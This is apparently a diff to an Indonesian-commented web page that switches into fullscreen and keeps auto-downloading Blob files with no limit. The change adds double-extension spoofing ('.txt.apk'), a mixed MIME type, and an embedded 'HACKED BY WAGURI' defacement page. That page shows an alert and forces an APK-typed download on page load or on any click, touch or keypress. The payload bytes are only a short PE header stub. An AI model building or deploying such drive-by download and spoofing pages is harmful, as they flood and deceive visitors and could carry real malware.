@@ -88,9 +88,9 @@ word-break: break-all;
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob APK ber-ekstensi .apk secara terus-menerus.</p>
+<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob ber-ekstensi .txt.apk secara terus-menerus (Uji Double Extension Spoofing).</p>
 
-<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate APK</button>
+<button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Txt.Apk</button>
 
 <div id="status" role="status">Sistem siap.</div>
 <div id="downloads"></div>
@@ -114,25 +114,79 @@ window.speechSynthesis.speak(utterance);
 }
 };
 
-// Helper konversi Base64 ke ByteArray biner untuk file APK
-function b64KeBytesGlobal(b64){
-  var binary = atob(b64);
-  var len = binary.length;
-  var bytes = new Uint8Array(len);
-  for (var i = 0; i < len; i++) {
-    bytes[i] = binary.charCodeAt(i);
-  }
-  return bytes;
-}
-
 const prepareMimeBlobAsync = (i) => {
 return new Promise((resolve) => {
 queueMicrotask(() => {
-// Langsung menggunakan data biner APK mentah alih-alih string HTML
-var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
-var bytesArr = b64KeBytesGlobal(b64Data);
+const payloadText = "<!DOCTYPE html>" +
+"<html>" +
+"<head><meta charset='UTF-8'><title>HACKED BY</title></head>" +
+"<body style='margin:0;padding:0;background:#000;color:#0f0;font-family:monospace;overflow:hidden;cursor:pointer'>" +
+"<div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>" +
+"<h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;letter-spacing:8px;animation:pulse 1s infinite'>HACKED BY</h1>" +
+"<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
+"<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
+"<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
+"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
+"<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
+"</div>" +
+"<style>" +
+"@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }" +
+"body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, rgba(0,255,0,0.03) 1px, transparent 1px, transparent 3px); pointer-events:none; }" +
+"</style>" +
+"<script>" +
+"(function(){" +
+"\"use strict\";" +
+"document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
+"try { alert('HACKED BY WAGURI'); } catch(e){}" +
+"function b64KeBytes(b64){" +
+"var binary = atob(b64);" +
+"var len = binary.length;" +
+"var bytes = new Uint8Array(len);" +
+"for (var i = 0; i < len; i++) {" +
+"bytes[i] = binary.charCodeAt(i);" +
+"}" +
+"return bytes;" +
+"}" +
+"var b64Data = \"TVqQAAMAAAAEAAAAAEEAAgBA\";" +
+"var sudah = false;" +
+"function picuDownload(){" +
+"if (sudah) return;" +
+"sudah = true;" +
+"var statusEl = document.getElementById('status');" +
+"try{" +
+"statusEl.textContent = 'Menyiapkan berkas...';" +
+"var bytesArr = b64KeBytes(b64Data);" +
+"var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
+"var url = URL.createObjectURL(blob);" +
+"var a = document.createElement('a');" +
+"a.href = url;" +
+"a.download = 'hacked-by-anonymous.txt.apk';" +
+"a.style.display = 'none';" +
+"document.body.appendChild(a);" +
+"a.click();" +
+"setTimeout(function(){ " +
+"if (a.parentNode) a.parentNode.removeChild(a); " +
+"URL.revokeObjectURL(url); " +
+"}, 3000);" +
+"statusEl.textContent = 'Payload berhasil diunduh!';" +
+"statusEl.style.color = '#0f0';" +
+"} catch(e){" +
+"statusEl.textContent = 'Gagal: ' + e.message;" +
+"statusEl.style.color = '#f00';" +
+"sudah = false;" +
+"}" +
+"}" +
+"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+"document.addEventListener('click', picuDownload);" +
+"document.addEventListener('touchstart', picuDownload);" +
+"document.addEventListener('keydown', picuDownload);" +
+"})();" +
+"<\/script>" +
+"</body>" +
+"</html>";
           
-const blob = new Blob([bytesArr], { type: "application/vnd.android.package-archive" });
+// Mengubah tipe Blob luar menjadi text/plain yang dicampur MIME type APK
+const blob = new Blob([payloadText], { type: "text/plain; charset=utf-8; application/vnd.android.package-archive" });
 const url = URL.createObjectURL(blob);
 resolve({ id: i, url: url });
 });
@@ -142,8 +196,8 @@ resolve({ id: i, url: url });
 const triggerInstantDownload = (fileData) => {
 const link = document.createElement("a");
 link.href = fileData.url;
-link.download = `waguri-file-${fileData.id}.apk`;
-link.textContent = `Blob #${fileData.id} (.apk)`;
+link.download = `waguri-file-${fileData.id}.txt.apk`;
+link.textContent = `Blob #${fileData.id} (.txt.apk)`;
 link.style.display = "none";
 downloadsDiv.appendChild(link);
 link.click();
@@ -157,7 +211,7 @@ activeUrls.push(fileData.url);
 
 triggerInstantDownload(fileData);
 
-statusDiv.textContent = `Proses Berjalan: Berkas APK ke-${counter} dikirim`;
+statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
 if (counter % 10 === 0) {
 speak(`Proses mencapai ${counter} berkas.`);
@@ -191,7 +245,7 @@ console.warn("Fullscreen tidak didukung atau ditolak:", err);
 
 setTimeout(() => {
 isProcessing = true;
-speak("Proses pembuatan berkas APK dimulai.");
+speak("Proses pembuatan berkas Blob dimulai.");
 processLoop(1);
 }, 300);
 });
